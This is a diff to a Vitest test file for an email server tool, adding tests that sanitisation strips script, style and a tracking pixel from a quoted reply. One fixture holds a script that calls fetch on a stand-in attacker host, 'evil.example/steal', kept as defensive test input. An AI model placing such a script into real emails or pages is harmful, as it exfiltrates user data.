@@ -7,9 +7,15 @@ import type { ServerContext } from "@modelcontextprotocol/server";
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import { EMAIL_TOOLS } from "../tools/emailTools.js";
 
-vi.mock("../htmlToMarkdown.js", () => ({
-  htmlToMarkdown: vi.fn(async (html: string) => `markdown(${html})`),
-}));
+// Only the markdown conversion is stubbed; sanitizeEmailHtml is the real one,
+// since what it strips out of a quote is exactly what these tests check.
+vi.mock("../htmlToMarkdown.js", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("../htmlToMarkdown.js")>();
+  return {
+    ...actual,
+    htmlToMarkdown: vi.fn(async (html: string) => `markdown(${html})`),
+  };
+});
 
 const AUTO_CONFIRM = {
   mcpReq: {
@@ -120,6 +126,74 @@ describe("send_email quotes the original on a reply", () => {
     expect(html).toContain("Ada Lovelace &lt;ada@example.com&gt; wrote:");
     expect(html).toContain("<blockquote");
     expect(html).toContain("<p>Here are the numbers.</p>");
+  });
+
+  it("strips script and style out of the quoted original", async () => {
+    mockFetchEmail.mockResolvedValue({
+      ...ORIGINAL,
+      htmlBody:
+        "<html><head><style>body{display:none}</style></head><body>" +
+        '<p>Here are the numbers.</p><script>fetch("https://evil.example/steal")</script>' +
+        "</body></html>",
+    });
+
+    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });
+
+    const { html } = composed();
+    expect(html).toContain("<p>Here are the numbers.</p>");
+    expect(html).not.toContain("<script");
+    expect(html).not.toContain("evil.example");
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("display:none");
+    // The document wrapper goes too — only the content survives.
+    expect(html).not.toContain("<html");
+    expect(html).not.toContain("<body");
+  });
+
+  it("strips a tracking pixel out of the quoted original", async () => {
+    mockFetchEmail.mockResolvedValue({
+      ...ORIGINAL,
+      htmlBody:
+        '<p>Here are the numbers.</p><img src="https://track.example/p.gif" width="1" height="1">',
+    });
+
+    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });
+
+    expect(composed().html).not.toContain("track.example");
+  });
+
+  it("falls back to the text body when the original's HTML sanitises to nothing", async () => {
+    mockFetchEmail.mockResolvedValue({
+      ...ORIGINAL,
+      htmlBody: "<script>everything()</script>",
+      textBody: "Here are the numbers.",
+    });
+
+    await send({ to: ["ada@example.com"], replyToUid: 42, html: "<p>Thanks!</p>" });
+
+    expect(composed().html).toContain("Here are the numbers.");
+    expect(composed().html).not.toContain("everything()");
+  });
+
+  it("normalises CRLF line endings in the text quote", async () => {
+    mockFetchEmail.mockResolvedValue({
+      ...ORIGINAL,
+      textBody: "Here are the numbers.\r\n\r\nAda",
+    });
+
+    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });
+
+    expect(composed().text).not.toContain("\r");
+    expect(composed().text).toContain("> Here are the numbers.\n>\n> Ada");
+  });
+
+  it("attributes to an unknown sender when the original has no From", async () => {
+    mockFetchEmail.mockResolvedValue({ ...ORIGINAL, from: undefined });
+
+    await send({ to: ["ada@example.com"], replyToUid: 42, text: "Thanks!" });
+
+    expect(composed().text).toContain("an unknown sender wrote:");
+    expect(composed().text).toContain("> Here are the numbers.");
   });
 
   it("quotes both bodies when the reply carries both", async () => {
